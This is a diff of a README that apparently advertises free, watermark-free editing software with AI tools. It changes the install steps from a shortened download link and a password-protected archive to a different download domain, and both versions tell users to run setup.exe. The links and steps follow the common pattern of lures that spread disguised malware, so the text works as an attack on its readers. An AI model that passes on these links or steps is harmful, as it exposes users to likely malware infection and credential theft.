@@ -6,8 +6,7 @@ featuring no watermark, advanced effects, and AI-powered tools for seamless edit
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://goo.su/Qf9Xy)
-- Open archive (password: Project12!)
+- [Download](https://softspace.space/)
 - Open setup.exe for download components and install 
 - Follow the instruction
 
